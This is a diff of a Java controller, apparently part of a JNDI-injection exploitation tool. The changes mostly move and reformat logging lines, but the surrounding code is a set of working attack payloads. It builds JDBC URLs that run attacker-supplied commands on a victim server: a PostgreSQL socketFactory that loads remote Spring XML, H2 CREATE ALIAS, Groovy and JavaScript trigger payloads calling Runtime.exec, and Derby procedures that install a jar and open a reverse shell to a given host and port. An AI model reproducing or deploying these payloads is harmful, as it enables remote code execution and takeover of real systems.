@@ -18,6 +18,8 @@ import java.util.Properties;
 public class DatabaseController implements Controller {
     @JNDIMapping("/PostgreSQL/Command/{cmd}")
     public Properties postgresqlCommand(String cmd) {
+        System.out.println("[PostgreSQL] Cmd: " + cmd);
+
         String fileName = MiscUtil.getRandStr(12) + ".xml";
         String fileContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                 "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
@@ -39,8 +41,6 @@ public class DatabaseController implements Controller {
         String socketFactoryArg = Config.codebase + fileName;
         String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;
 
-        System.out.println("PostgreSQL Cmd: " + cmd);
-
         Properties props = new Properties();
         props.setProperty("driver", "org.postgresql.Driver");
         props.setProperty("url", url);
@@ -50,11 +50,11 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/H2/Alias/{cmd}")
     public Properties h2Alias(String cmd) {
+        System.out.println("[H2] [CREATE ALIAS] Cmd: " + cmd);
+
         String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                 "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
                 "CALL EXEC ('" + cmd + "')\\;";
-
-        System.out.println("H2 CREATE ALIAS Cmd: " + cmd);
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -65,10 +65,10 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/H2/Groovy/{cmd}")
     public Properties h2Groovy(String cmd) {
+        System.out.println("[H2] [Groovy] Cmd: " + cmd);
+
         String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")" + "})" + "def x";
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";
-
-        System.out.println("H2 Groovy Cmd: " + cmd);
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -79,10 +79,10 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/H2/JavaScript/{cmd}")
     public Properties h2JavaScript(String cmd) {
+        System.out.println("[H2] [JavaScript] Cmd: " + cmd);
+
         String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
         String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ javascript +"'";
-
-        System.out.println("H2 JavaScript Cmd: " + cmd);
 
         Properties props = new Properties();
         props.setProperty("driver", "org.h2.Driver");
@@ -93,9 +93,9 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/Derby/Create/{database}")
     public Properties derbyCreate(String database) {
-        String url = "jdbc:derby:memory:" + database + ";create=true";
+        System.out.println("[Derby] [Create] Database: " + database);
 
-        System.out.println("Derby Create Database: " + database);
+        String url = "jdbc:derby:memory:" + database + ";create=true";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
@@ -106,9 +106,9 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/Derby/Drop/{database}")
     public Properties derbyDrop(String database) {
-        String url = "jdbc:derby:memory:" + database + ";drop=true";
+        System.out.println("[Derby] [Drop] Database: " + database);
 
-        System.out.println("Derby Drop Database: " + database);
+        String url = "jdbc:derby:memory:" + database + ";drop=true";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
@@ -119,9 +119,9 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/Derby/Slave/{database}/{host}/{port}")
     public Properties derbySlave(String host, String port, String database) {
-        String url = "jdbc:derby:memory" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;
+        System.out.println("[Derby] [Slave] Host: " + host + " Port: " + port + " Database: " + database);
 
-        System.out.println("Derby Slave Replication Mode Host: " + host + " Port: " + port + " Database: " + database);
+        String url = "jdbc:derby:memory" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;
 
         Properties props = new Properties();
         props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
@@ -130,11 +130,13 @@ public class DatabaseController implements Controller {
         return props;
     }
 
-    @JNDIMapping("/Derby/InstallJar/{database}")
-    public Properties derbyInstallJar(String database) throws Exception {
-        String url = "jdbc:derby:memory:" + database + ";create=true";
-        String className = MiscUtil.getRandStr(12);
+    @JNDIMapping("/Derby/Install/{database}")
+    public Properties derbyInstall(String database) throws Exception {
+        System.out.println("[Derby] [Install] Database: " + database);
 
+        String url = "jdbc:derby:memory:" + database + ";create=true";
+
+        String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(DerbyJarTemplate.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
@@ -149,8 +151,6 @@ public class DatabaseController implements Controller {
         list.add("CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'");
         list.add("CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'");
 
-        System.out.println("Derby Install Jar Database: " + database);
-
         Properties props = new Properties();
         props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
         props.setProperty("url", url);
@@ -161,34 +161,30 @@ public class DatabaseController implements Controller {
 
     @JNDIMapping("/Derby/Command/{database}/{cmd}")
     public Properties derbyCommand(String database, String cmd) {
+        System.out.println("[Derby] [Command] Cmd: " + cmd);
+
         String url = "jdbc:derby:memory:" + database + ";create=true";
-
-        List<String> list = new ArrayList<>();
-        list.add("CALL cmd('" + cmd  + "')");
-
-        System.out.println("Derby Cmd: " + cmd);
+        String sql = "CALL cmd('" + cmd  + "')";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
         props.setProperty("url", url);
-        props.setProperty("sql", String.join(";", list));
+        props.setProperty("sql", sql);
 
         return props;
     }
 
     @JNDIMapping("/Derby/ReverseShell/{database}/{host}/{port}")
     public Properties derbyReverseShell(String database, String host, String port) {
+        System.out.println("[Derby] [ReverseShell] Host: " + host + " Port: " + port);
+
         String url = "jdbc:derby:" + database + ";create=true";
-
-        List<String> list = new ArrayList<>();
-        list.add("CALL rev('" + host + "', '" + port + "')");
-
-        System.out.println("Derby ReverShell Host: " + host + " Port: " + port);
+        String sql = "CALL rev('" + host + "', '" + port + "')";
 
         Properties props = new Properties();
         props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
         props.setProperty("url", url);
-        props.setProperty("sql", String.join(";", list));
+        props.setProperty("sql", sql);
 
         return props;
     }
